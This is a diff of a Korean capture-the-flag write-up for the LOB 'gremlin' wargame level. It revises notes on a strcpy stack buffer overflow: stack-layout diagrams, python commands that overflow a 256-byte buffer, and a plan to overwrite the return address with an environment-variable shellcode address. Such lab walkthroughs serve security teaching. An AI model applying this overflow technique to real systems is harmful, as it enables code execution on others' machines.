@@ -1,5 +1,5 @@
 ============================================================================================================
-[redhat-lob] gremlin
+[redhat-lob] (1) gremlin
 ============================================================================================================
 
 
@@ -21,8 +21,6 @@
 Source code
 ============================================================================================================
 
-lob 문제의 경우 소스코드가 공개되어 있으며, 소스코드는 다음과 같다.
-
 .. code-block:: c
 
     int main(int argc, char *argv[])
@@ -42,9 +40,7 @@ lob 문제의 경우 소스코드가 공개되어 있으며, 소스코드는 다
 Vulnerabliity Vector
 ============================================================================================================
 
-
 스택 메모리 공간에 다음과 같이 들어가게 된다.
-사이즈가 256바이트인 char 형 변수 배열 buffer가 선언되어 있는데, 해당 사이즈보다 큰 값을 입력할 경우 오버플로우가 발생한다.
 
 .. code-block:: console
 
@@ -52,8 +48,11 @@ Vulnerabliity Vector
     LOW     
     ---------------
     Buffer  (256byte)
-    SFP     (4byte) <- strcpy overflow
-    RET     (4byte)
+    SFP     (4byte) 
+    RET     (4byte)  <- strcpy overflow
+    argc    (4byte)  <- 0x00000002
+    argv[0] (4byte)  <- argv[0] 주소
+    argv[1] (4byte)  <- argv[1] 주소
     ---------------
     HIGH    
     ===============
@@ -63,14 +62,10 @@ Vulnerabliity Vector
 Buffer Overflow
 ============================================================================================================
 
-strcpy에서 argv[1] 인자 값을 통해 buffer 변수에 입력될 때, 값이 버퍼보다 클 경우 오버플로우가 발생된다.
-
-※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
-
 .. code-block:: console
-
+    
+    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
     $ bash2
-
     $ ./gremlin `python -c "print 'a'*256"`
 
     aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
@@ -79,7 +74,6 @@ strcpy에서 argv[1] 인자 값을 통해 buffer 변수에 입력될 때, 값이
     aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
     aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
     aaaaaa
-
     $ ./gremlin `python -c "print 'a'*260"`
 
     aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
@@ -95,8 +89,6 @@ strcpy에서 argv[1] 인자 값을 통해 buffer 변수에 입력될 때, 값이
 
 exploit
 ============================================================================================================
-
-현재 버퍼 오버플로우가 발생하는 것을 확인하였으니, 해당 오버플로우시 RET에서 리턴되는 주소값을 내가 원하는 주소로 바꿔 쉘코드를 실행하도록 해보자.
 
 환경 변수 상에 쉘코드 등록
 ------------------------------------------------------------------------------------------------------------
@@ -152,6 +144,9 @@ RET 주소를 환경 변수 주소로 덮어씌워 공격 진행
     Buffer  (256byte) <- "\x90"*256
     SFP     (4byte)   <- "\x90"*4
     RET     (4byte)   <- shellcode 환경 변수 주소
+    argc    (4byte)   <- 0x00000002
+    argv[0] (4byte)   <- argv[0] 주소
+    argv[1] (4byte)   <- argv[1] 주소
     ---------------
     HIGH    
     ===============
